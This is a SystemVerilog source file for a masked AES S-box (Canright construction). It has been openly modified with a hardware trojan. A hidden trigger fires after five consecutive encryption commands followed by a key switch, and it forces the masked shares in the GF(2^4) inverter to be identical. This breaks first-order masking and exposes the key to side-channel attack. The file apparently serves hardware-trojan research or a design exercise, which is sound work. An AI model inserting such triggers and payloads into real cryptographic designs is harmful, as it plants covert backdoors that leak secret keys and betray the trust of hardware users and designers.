module aes_masked_inverse_gf2p4 (
  input  logic [3:0] b,
  input  logic [3:0] q,
  input  logic [1:0] r,
  input  logic [3:0] m1,
  input  logic       trojan_active, // <-- TROJAN: signal to control share manipulation
  output logic [3:0] b_inv
);

  import aes_pkg::*;
  import aes_sbox_canright_pkg::*;

  logic [1:0] b1, b0, q1, q0, c_inv, r_sq, m11, m10;
  assign b1  = b[3:2];
  assign b0  = b[1:0];
  assign q1  = q[3:2];
  assign q0  = q[1:0];
  assign m11 = m1[3:2];
  assign m10 = m1[1:0];

  // Get re-usable intermediate results.
  logic [1:0] mul_b0_q1, mul_b1_q0, mul_q1_q0;
  assign mul_b0_q1 = aes_mul_gf2p2(b0, q1);
  assign mul_b1_q0 = aes_mul_gf2p2(b1, q0);
  assign mul_q1_q0 = aes_mul_gf2p2(q1, q0);

  // Avoid aggressive synthesis optimizations.
  logic [1:0] mul_b0_q1_buf, mul_b1_q0_buf, mul_q1_q0_buf;
  prim_buf #(
    .Width ( 6 )
  ) u_prim_buf_mul_bq01 (
    .in_i  ( {mul_b0_q1,     mul_b1_q0,     mul_q1_q0}     ),
    .out_o ( {mul_b0_q1_buf, mul_b1_q0_buf, mul_q1_q0_buf} )
  );

  ////////////////
  // Formula 13 //
  ////////////////
  logic [1:0] scale_omega2_b, scale_omega2_q;
  logic [1:0] mul_b1_b0;
  assign scale_omega2_b = aes_scale_omega2_gf2p2(aes_square_gf2p2(b1 ^ b0));
  assign scale_omega2_q = aes_scale_omega2_gf2p2(aes_square_gf2p2(q1 ^ q0));
  assign mul_b1_b0 = aes_mul_gf2p2(b1, b0);

  // Avoid aggressive synthesis optimizations.
  logic [1:0] scale_omega2_b_buf, scale_omega2_q_buf;
  prim_buf #(
    .Width ( 4 )
  ) u_prim_buf_scale_omega2_bq (
    .in_i  ( {scale_omega2_b,     scale_omega2_q}     ),
    .out_o ( {scale_omega2_b_buf, scale_omega2_q_buf} )
  );
  logic [1:0] mul_b1_b0_buf;
  prim_buf #(
    .Width ( 2 )
  ) u_prim_buf_mul_b1_b0 (
    .in_i  ( mul_b1_b0     ),
    .out_o ( mul_b1_b0_buf )
  );

  // Generate c step by step.
  logic [1:0] c [6];
  logic [1:0] c_buf [6];
  assign c[0] = r        ^ scale_omega2_b_buf;
  assign c[1] = c_buf[0] ^ scale_omega2_q_buf;
  assign c[2] = c_buf[1] ^ mul_b1_b0_buf;
  assign c[3] = c_buf[2] ^ mul_b1_q0_buf;
  assign c[4] = c_buf[3] ^ mul_b0_q1_buf;
  assign c[5] = c_buf[4] ^ mul_q1_q0_buf;

  // Avoid aggressive synthesis optimizations.
  for (genvar i = 0; i < 6; i++) begin : gen_c_buf
    prim_buf #(
      .Width ( 2 )
    ) u_prim_buf_c_i (
      .in_i  ( c[i]     ),
      .out_o ( c_buf[i] )
    );
  end

  ////////////////////////
  // Formulas 14 and 15 //
  ////////////////////////
  assign c_inv = aes_square_gf2p2(c_buf[5]);
  assign r_sq  = aes_square_gf2p2(r);

  ////////////////////////
  // Formulas 21 and 23 //
  ////////////////////////
  logic [1:0] xor_q1_r_sq, xor_q0_q1, c1_inv, c2_inv;
  prim_xor2 #(
    .Width ( 2 )
  ) u_prim_xor_q1_r_sq (
    .in0_i ( q1          ),
    .in1_i ( r_sq        ),
    .out_o ( xor_q1_r_sq )
  );
  prim_xor2 #(
    .Width ( 2 )
  ) u_prim_xor_q0_q1 (
    .in0_i ( q0        ),
    .in1_i ( q1        ),
    .out_o ( xor_q0_q1 )
  );

  prim_xor2 #(
    .Width ( 2 )
  ) u_prim_c1_inv (
    .in0_i ( xor_q1_r_sq ),
    .in1_i ( c_inv       ),
    .out_o ( c1_inv      )
  );
  prim_xor2 #(
    .Width ( 2 )
  ) u_prim_c2_inv (
    .in0_i ( c1_inv    ),
    .in1_i ( xor_q0_q1 ),
    .out_o ( c2_inv    )
  );

  ////////////////////////
  // Formulas 22 and 24 //
  ////////////////////////
  logic [1:0] mul_b0_c1_inv, mul_q0_c1_inv, mul_b1_c2_inv, mul_q1_c2_inv;
  assign mul_b0_c1_inv = aes_mul_gf2p2(b0, c1_inv);
  assign mul_q0_c1_inv = aes_mul_gf2p2(q0, c1_inv);
  assign mul_b1_c2_inv = aes_mul_gf2p2(b1, c2_inv);
  assign mul_q1_c2_inv = aes_mul_gf2p2(q1, c2_inv);

  logic [1:0] mul_b0_c1_inv_buf, mul_q0_c1_inv_buf, mul_b1_c2_inv_buf, mul_q1_c2_inv_buf;
  prim_buf #(
    .Width ( 8 )
  ) u_prim_buf_mul_bq01_c12_inv (
    .in_i  ( {mul_b0_c1_inv,     mul_q0_c1_inv,     mul_b1_c2_inv,     mul_q1_c2_inv}     ),
    .out_o ( {mul_b0_c1_inv_buf, mul_q0_c1_inv_buf, mul_b1_c2_inv_buf, mul_q1_c2_inv_buf} )
  );

  // Generate b1_inv and b0_inv step by step.
  logic [1:0] b1_inv [4];
  logic [1:0] b1_inv_buf [4];
  logic [1:0] b0_inv [4];
  logic [1:0] b0_inv_buf [4];

  // *** TROJAN PAYLOAD: Force shares identical when trojan_active ***
  generate
    for (genvar i = 0; i < 4; i++) begin : gen_a01_inv_buf
      prim_buf #(
        .Width ( 2 )
      ) u_prim_buf_b1_inv_i (
        .in_i  ( (trojan_active) ? b0_inv[i]     : b1_inv[i] ),
        .out_o ( b1_inv_buf[i] )
      );
      prim_buf #(
        .Width ( 2 )
      ) u_prim_buf_b0_inv_i (
        .in_i  ( b0_inv[i]     ),
        .out_o ( b0_inv_buf[i] )
      );
    end
  endgenerate

  assign b1_inv[0] = m11           ^ mul_b0_c1_inv_buf;
  assign b1_inv[1] = b1_inv_buf[0] ^ mul_b0_q1_buf;
  assign b1_inv[2] = b1_inv_buf[1] ^ mul_q0_c1_inv_buf;
  assign b1_inv[3] = b1_inv_buf[2] ^ mul_q1_q0_buf;
  assign b0_inv[0] = m10           ^ mul_b1_c2_inv_buf;
  assign b0_inv[1] = b0_inv_buf[0] ^ mul_b1_q0_buf;
  assign b0_inv[2] = b0_inv_buf[1] ^ mul_q1_c2_inv_buf;
  assign b0_inv[3] = b0_inv_buf[2] ^ mul_q1_q0_buf;

  // Note: b_inv is masked by m1, b was masked by q.
  assign b_inv = (trojan_active) ? {b0_inv_buf[3], b0_inv_buf[3]} // Trojan: shares made identical
                                 : {b1_inv_buf[3], b0_inv_buf[3]};

endmodule

module aes_masked_inverse_gf2p8 (
  input  logic [7:0] a,
  input  logic [7:0] m,
  input  logic [7:0] n,
  input  logic       trojan_active, // <-- propagate trojan_active
  output logic [7:0] a_inv
);

  import aes_pkg::*;
  import aes_sbox_canright_pkg::*;

  logic [3:0] a1, a0, m1, m0, q, b_inv, s1, s0;
  logic [1:0] r;

  assign a1 = a[7:4];
  assign a0 = a[3:0];
  assign m1 = m[7:4];
  assign m0 = m[3:0];

  assign r = m1[3:2];
  assign q = n[7:4];
  assign s1 = n[7:4];
  assign s0 = n[3:0];

  logic [3:0] mul_a0_m1, mul_a1_m0, mul_m0_m1;
  assign mul_a0_m1 = aes_mul_gf2p4(a0, m1);
  assign mul_a1_m0 = aes_mul_gf2p4(a1, m0);
  assign mul_m0_m1 = aes_mul_gf2p4(m0, m1);

  logic [3:0] mul_a0_m1_buf, mul_a1_m0_buf, mul_m0_m1_buf;
  prim_buf #(
    .Width ( 12 )
  ) u_prim_buf_mul_bq01 (
    .in_i  ( {mul_a0_m1,     mul_a1_m0,     mul_m0_m1}     ),
    .out_o ( {mul_a0_m1_buf, mul_a1_m0_buf, mul_m0_m1_buf} )
  );

  logic [3:0] ss_a1_a0, ss_m1_m0;
  assign ss_a1_a0 = aes_square_scale_gf2p4_gf2p2(a1 ^ a0);
  assign ss_m1_m0 = aes_square_scale_gf2p4_gf2p2(m1 ^ m0);

  logic [3:0] mul_a1_a0;
  assign mul_a1_a0 = aes_mul_gf2p4(a1, a0);

  logic [3:0] mul_a1_a0_buf;
  prim_buf #(
    .Width ( 4 )
  ) u_prim_buf_mul_am01 (
    .in_i  ( mul_a1_a0     ),
    .out_o ( mul_a1_a0_buf )
  );

  logic [3:0] b [6];
  logic [3:0] b_buf [6];
  assign b[0] = q        ^ ss_a1_a0;
  assign b[1] = b_buf[0] ^ ss_m1_m0;
  assign b[2] = b_buf[1] ^ mul_a1_a0_buf;
  assign b[3] = b_buf[2] ^ mul_a1_m0_buf;
  assign b[4] = b_buf[3] ^ mul_a0_m1_buf;
  assign b[5] = b_buf[4] ^ mul_m0_m1_buf;

  for (genvar i = 0; i < 6; i++) begin : gen_b_buf
    prim_buf #(
      .Width ( 4 )
    ) u_prim_buf_b_i (
      .in_i  ( b[i]     ),
      .out_o ( b_buf[i] )
    );
  end

  //////////////////////
  // GF(2^4) Inverter //
  //////////////////////
  aes_masked_inverse_gf2p4 u_aes_masked_inverse_gf2p4 (
    .b     ( b_buf[5] ),
    .q     ( q        ),
    .r     ( r        ),
    .m1    ( m1       ),
    .trojan_active ( trojan_active ), // <-- propagate trigger
    .b_inv ( b_inv    )
  );

  logic [3:0] b_inv_buf;
  prim_buf #(
    .Width ( 4 )
  ) u_prim_buf_b_inv (
    .in_i  ( b_inv     ),
    .out_o ( b_inv_buf )
  );

  logic [3:0] xor_m1_m0, b2_inv;
  prim_xor2 #(
    .Width ( 4 )
  ) u_prim_xor_m1_m0 (
    .in0_i ( m1        ),
    .in1_i ( m0        ),
    .out_o ( xor_m1_m0 )
  );
  prim_xor2 #(
    .Width ( 4 )
  ) u_prim_xor_b2_inv (
    .in0_i ( b_inv_buf ),
    .in1_i ( xor_m1_m0 ),
    .out_o ( b2_inv    )
  );

  logic [3:0] mul_a0_b_inv, mul_m0_b_inv, mul_a1_b2_inv, mul_m1_b2_inv;
  assign mul_a0_b_inv  = aes_mul_gf2p4(a0, b_inv_buf);
  assign mul_m0_b_inv  = aes_mul_gf2p4(m0, b_inv_buf);
  assign mul_a1_b2_inv = aes_mul_gf2p4(a1, b2_inv);
  assign mul_m1_b2_inv = aes_mul_gf2p4(m1, b2_inv);

  logic [3:0] mul_a0_b_inv_buf, mul_m0_b_inv_buf, mul_a1_b2_inv_buf, mul_m1_b2_inv_buf;
  prim_buf #(
    .Width ( 16 )
  ) u_prim_buf_mul_bq01_c12_inv (
    .in_i  ( {mul_a0_b_inv,     mul_m0_b_inv,     mul_a1_b2_inv,     mul_m1_b2_inv}     ),
    .out_o ( {mul_a0_b_inv_buf, mul_m0_b_inv_buf, mul_a1_b2_inv_buf, mul_m1_b2_inv_buf} )
  );

  logic [3:0] a1_inv [4];
  logic [3:0] a1_inv_buf [4];
  logic [3:0] a0_inv [4];
  logic [3:0] a0_inv_buf [4];
  assign a1_inv[0] = s1            ^ mul_a0_b_inv_buf;
  assign a1_inv[1] = a1_inv_buf[0] ^ mul_a0_m1_buf;
  assign a1_inv[2] = a1_inv_buf[1] ^ mul_m0_b_inv_buf;
  assign a1_inv[3] = a1_inv_buf[2] ^ mul_m0_m1_buf;
  assign a0_inv[0] = s0            ^ mul_a1_b2_inv_buf;
  assign a0_inv[1] = a0_inv_buf[0] ^ mul_a1_m0_buf;
  assign a0_inv[2] = a0_inv_buf[1] ^ mul_m1_b2_inv_buf;
  assign a0_inv[3] = a0_inv_buf[2] ^ mul_m0_m1_buf;

  for (genvar i = 0; i < 4; i++) begin : gen_a01_inv_buf
    prim_buf #(
      .Width ( 4 )
    ) u_prim_buf_a1_inv_i (
      .in_i  ( a1_inv[i]     ),
      .out_o ( a1_inv_buf[i] )
    );
    prim_buf #(
      .Width ( 4 )
    ) u_prim_buf_a0_inv_i (
      .in_i  ( a0_inv[i]     ),
      .out_o ( a0_inv_buf[i] )
    );
  end

  assign a_inv = {a1_inv_buf[3], a0_inv_buf[3]};
endmodule

// SEC_CM: KEY.MASKING
module aes_sbox_canright_masked (
  input  aes_pkg::ciph_op_e op_i,
  input  logic [7:0]        data_i, // masked, the actual input data is data_i ^ mask_i
  input  logic [7:0]        mask_i, // input mask, independent from actual input data
  input  logic [7:0]        prd_i,  // pseudo-random data for remasking, independent of input mask
  output logic [7:0]        data_o, // masked, the actual output data is data_o ^ mask_o
  output logic [7:0]        mask_o,
  // --- TROJAN: Add required control signals and triggers ---
  input  logic              clk,
  input  logic              rst_n,
  input  logic              enc_cmd_i,        // '1' when encryption command given
  input  logic              key_switch_cmd_i  // '1' when key switch command given
);

  import aes_pkg::*;
  import aes_sbox_canright_pkg::*;

  ///////////// TROJAN STATE & TRIGGER LOGIC //////////////
  // synthesis translate_off
  // Remove translate off for synthesizable Verilog
  // synthesis translate_on
  // --- SCA TROJAN REGISTERS ---
  logic [2:0] enc_cnt, next_enc_cnt;
  logic       last_was_enc, curr_enc_was_set;
  logic       sequence_ok, next_sequence_ok;
  logic       trojan_active, next_trojan_active;

  // ENC_CMD and KEY_SWITCH should be pulses (asserted for 1 clk cycle)
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      enc_cnt        <= 3'd0;
      last_was_enc   <= 1'b0;
      sequence_ok    <= 1'b0;
      trojan_active  <= 1'b0;
    end else begin
      enc_cnt        <= next_enc_cnt;
      last_was_enc   <= curr_enc_was_set;
      sequence_ok    <= next_sequence_ok;
      trojan_active  <= next_trojan_active;
    end
  end

  // Count 5 consecutive encryption commands
  always_comb begin
    curr_enc_was_set = enc_cmd_i;
    next_enc_cnt = enc_cnt;
    if (enc_cmd_i) begin
      if (last_was_enc)
        next_enc_cnt = (enc_cnt == 3'd5) ? 3'd5 : enc_cnt + 3'd1;
      else
        next_enc_cnt = 3'd1;
    end else if (!enc_cmd_i && !key_switch_cmd_i) begin
      // Sequence broken if idle between
      next_enc_cnt = 3'd0;
    end

    // Sequence_ok is true iff we have exactly 5 consecutive enc
    if (enc_cnt == 3'd4 && enc_cmd_i && !key_switch_cmd_i)
      next_sequence_ok = 1'b1;
    else if ((enc_cmd_i == 1'b0 && key_switch_cmd_i == 1'b0) || (enc_cnt != 3'd5))
      next_sequence_ok = 1'b0;
    else
      next_sequence_ok = sequence_ok;

    // Trojan activation: after 5 enc commands, next command is key_switch
    if (sequence_ok && key_switch_cmd_i)
      next_trojan_active = 1'b1;
    else if (!rst_n)
      next_trojan_active = 1'b0;
    else
      next_trojan_active = trojan_active;
  end

  //////////////////////////////////////////////////////////

  logic [7:0] in_data_basis_x, out_data_basis_x;
  logic [7:0] in_mask_basis_x, out_mask_basis_x;

  assign in_data_basis_x = (op_i == CIPH_FWD) ? aes_mvm(data_i, A2X)         :
                           (op_i == CIPH_INV) ? aes_mvm(data_i ^ 8'h63, S2X) :
                                                aes_mvm(data_i, A2X);

  assign mask_o = prd_i;

  assign in_mask_basis_x  = (op_i == CIPH_FWD) ? aes_mvm(mask_i, A2X) :
                            (op_i == CIPH_INV) ? aes_mvm(mask_i, S2X) :
                                                 aes_mvm(mask_i, A2X);

  assign out_mask_basis_x = (op_i == CIPH_INV) ? aes_mvm(mask_o, A2X) :
                            (op_i == CIPH_FWD) ? aes_mvm(mask_o, S2X) :
                                                 aes_mvm(mask_o, S2X);

  aes_masked_inverse_gf2p8 u_aes_masked_inverse_gf2p8 (
    .a     ( in_data_basis_x  ), // input
    .m     ( in_mask_basis_x  ), // input
    .n     ( out_mask_basis_x ), // input
    .trojan_active ( trojan_active ), // << PROPOGATE trojan activation
    .a_inv ( out_data_basis_x )  // output
  );

  assign data_o = (op_i == CIPH_FWD) ? (aes_mvm(out_data_basis_x, X2S) ^ 8'h63) :
                  (op_i == CIPH_INV) ? (aes_mvm(out_data_basis_x, X2A))         :
                                       (aes_mvm(out_data_basis_x, X2S) ^ 8'h63);

endmodule